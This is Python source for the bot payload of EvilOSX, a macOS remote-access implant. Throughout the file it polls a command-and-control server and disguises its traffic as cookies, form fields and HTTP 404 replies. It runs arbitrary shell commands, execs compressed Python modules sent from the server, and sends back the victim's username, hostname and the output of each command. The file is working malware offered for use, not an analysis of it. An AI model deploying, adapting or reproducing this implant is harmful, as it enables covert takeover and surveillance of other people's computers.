#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Minimal bot which loads modules as they are needed from the server (Python 3)."""
__author__ = "Marten4n6"
__license__ = "GPLv3"
__version__ = "4.1.1"

from base64 import b64encode, b64decode
from binascii import hexlify, Error
from threading import Timer, Thread
from time import sleep, time
from zlib import decompress
from urllib.parse import urlencode
import getpass
import json
import logging
import os
import platform
import subprocess
import sys
import traceback
import uuid
import urllib.request
import urllib.error

# *************************************************************
# These variables will be patched when this payload is created.
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
USER_AGENT = ""
PROGRAM_DIRECTORY = ""
LOADER_OPTIONS = {"loader_name": "launch_daemon"}
# *************************************************************

COMMAND_INTERVAL = 1
IDLE_INTERVAL = 30
IDLE_TIME = 60
IDLE_SLEEP_INTERVAL = 5

logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger(__name__)


class CommandType:
    NONE = 0
    MODULE = 1
    SHELL = 2


class RequestType:
    GET_COMMAND = 1
    RESPONSE = 2


class Command:
    def __init__(self, command_type, command=None, options=None):
        self.type = command_type
        self.command = command
        self.options = options


def get_uid():
    return hexlify((getpass.getuser() + "-" + str(uuid.getnode()) + "-" + __version__).encode()).decode()


def _to_str(data):
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data if data is not None else ""


def run_command(command, cleanup=True, kill_on_timeout=True):
    command = _to_str(command)
    if len(command) > 3 and command[0:3] == "cd ":
        try:
            os.chdir(os.path.expanduser(command[3:]))
            return "Directory changed to: " + os.getcwd()
        except Exception as ex:
            log.error(str(ex))
            return str(ex)
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        timer = None
        try:
            if kill_on_timeout:
                timer = Timer(60, lambda p: p.kill(), [process])
                timer.start()
            stdout, stderr = process.communicate()
            response = _to_str(stdout + stderr)
            if cleanup:
                return response.replace("\n", "")
            if len(response.split("\n")) == 2:
                return response.replace("\n", "")
            return response
        finally:
            if timer:
                timer.cancel()
    except Exception as ex:
        log.error(str(ex))
        return str(ex)


class ModuleTask(Thread):
    def __init__(self, command):
        Thread.__init__(self)
        self._command = command
        self._is_killed = False

    def write(self, text):
        if text is None or text == "\n":
            return
        if isinstance(text, bytes):
            try:
                text = text.decode("utf-8")
            except UnicodeDecodeError:
                text = text.decode("latin-1", errors="replace")
        text = str(text)
        if not text or text == "\n":
            return
        opts = self._command.options or {}
        module_name = opts.get("module_name", "")
        response_options = opts.get("response_options", {}) or {}
        send_response(text, module_name, response_options)

    def flush(self):
        pass

    def run(self):
        old_stdout = sys.stdout
        sys.stdout = self
        sys.settrace(self.global_trace)
        try:
            try:
                module = compile(
                    decompress(b64decode(self._command.command)).decode("utf-8", errors="replace"),
                    "<string>",
                    "exec",
                )
            except Error:
                send_response("Could not decode string as Base64 (len:%s).\n" % len(self._command.command or b""))
                return

            if self._command.options is None:
                self._command.options = {}
            self._command.options["server_host"] = SERVER_HOST
            self._command.options["server_port"] = SERVER_PORT
            self._command.options["program_directory"] = PROGRAM_DIRECTORY
            self._command.options["loader_options"] = LOADER_OPTIONS

            module_dict = {}
            try:
                exec(module, module_dict)
                module_dict["run"](self._command.options)
            except Exception:
                send_response("Error executing module: \n" + traceback.format_exc())
        finally:
            sys.settrace(None)
            sys.stdout = old_stdout

    def global_trace(self, frame, why, arg):
        if why == "call":
            return self.local_trace
        return None

    def local_trace(self, frame, why, arg):
        if self._is_killed and why == "line":
            raise SystemExit()
        return self.local_trace

    def kill(self):
        self._is_killed = True


def send_response(response, module_name="", response_options=None):
    if response_options is None or not isinstance(response_options, dict):
        response_options = {}

    headers = {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {
        "response": b64encode(_to_str(response).encode("utf-8", errors="replace")).decode("ascii"),
        "bot_uid": get_uid(),
        "module_name": module_name or "",
        "response_options": response_options,
    }
    body = urlencode({"username": b64encode(json.dumps(payload).encode()).decode("ascii")})
    try:
        request = urllib.request.Request(
            "http://%s:%s" % (SERVER_HOST, SERVER_PORT),
            data=body.encode("utf-8"),
            headers=headers,
        )
        urllib.request.urlopen(request)
    except urllib.error.HTTPError as ex:
        if ex.code != 404:
            raise
    except Exception as ex:
        log.error("send_response failed: %s", ex)
        try:
            open("/tmp/evilosx_send_err.log", "a").write(str(ex) + chr(10))
        except Exception:
            pass


def _extract_debug_payload(response):
    """Extract command blob after DEBUG: marker from server 404 body."""
    marker = b"DEBUG:"
    if marker not in response:
        return None
    processed = response.split(marker, 1)[1]
    # Accept DEBUG:\\n, DEBUG:\\r\\n, or DEBUG:\\n\\n (legacy)
    if processed.startswith(b"\r\n"):
        processed = processed[2:]
    elif processed.startswith(b"\n"):
        processed = processed[1:]
    if processed.startswith(b"\r\n"):
        processed = processed[2:]
    elif processed.startswith(b"\n"):
        processed = processed[1:]
    processed = processed.replace(b"DEBUG-->", b"").strip()
    return processed


def get_command():
    session_cfg = {
        "type": RequestType.GET_COMMAND,
        "username": _to_str(run_command("whoami")),
        "hostname": _to_str(run_command("hostname")),
        "path": _to_str(run_command("pwd")),
        "version": str(platform.mac_ver()[0]),
        "loader_name": (LOADER_OPTIONS or {}).get("loader_name", ""),
    }
    headers = {
        "User-Agent": USER_AGENT,
        "Cookie": "session="
        + b64encode(get_uid().encode()).decode("ascii")
        + "-"
        + b64encode(json.dumps(session_cfg).encode()).decode("ascii"),
    }
    response = b""
    try:
        urllib.request.urlopen(
            urllib.request.Request("http://%s:%s" % (SERVER_HOST, SERVER_PORT), headers=headers)
        )
    except urllib.error.HTTPError as ex:
        if ex.code == 404:
            response = ex.read()
            log.debug("Raw response: %s", response)
        else:
            log.error(str(ex))

    try:
        processed = _extract_debug_payload(response)
        if not processed:
            return Command(CommandType.NONE)

        try:
            processed_split = b64decode(processed).split(b"\n")
        except Error:
            return Command(CommandType.NONE)

        if not processed_split or not processed_split[0]:
            return Command(CommandType.NONE)

        command_type = int(processed_split[0])
        command = processed_split[1] if len(processed_split) > 1 else b""
        options = None
        if len(processed_split) > 2 and processed_split[2]:
            try:
                options = json.loads(b64decode(processed_split[2]).decode())
            except (ValueError, Error, TypeError):
                options = None

        log.debug("Type: %s", command_type)
        log.debug("Command: %s", command)
        log.debug("Options: %s", options)
        return Command(command_type, command, options)
    except (IndexError, ValueError):
        return Command(CommandType.NONE)


def main():
    last_active = time()
    idle = False
    log.info("Starting EvilOSX v%s...", __version__)

    while True:
        try:
            log.info("Receiving command...")
            command = get_command()
            if command.type != CommandType.NONE:
                if idle:
                    log.info("Switching from idle back to normal mode...")
                last_active = time()
                idle = False
                if command.type == CommandType.MODULE:
                    log.debug("Running module...")
                    module_task = ModuleTask(command)
                    module_task.daemon = True
                    module_task.start()
                else:
                    log.debug("Running command...")
                    send_response(run_command(_to_str(b64decode(command.command)), cleanup=False))
            else:
                log.info("No command received.")
                if idle:
                    sleep(IDLE_INTERVAL)
                elif (time() - last_active) >= IDLE_TIME:
                    log.info("The last command was a while ago, switching to idle...")
                    idle = True
                else:
                    sleep(COMMAND_INTERVAL)
        except Exception as ex:
            if "Connection refused" in str(ex):
                log.error("Failed to connect to the server.")
                sleep(IDLE_SLEEP_INTERVAL)
            else:
                log.error(traceback.format_exc())
                sleep(IDLE_SLEEP_INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("Interrupted.")
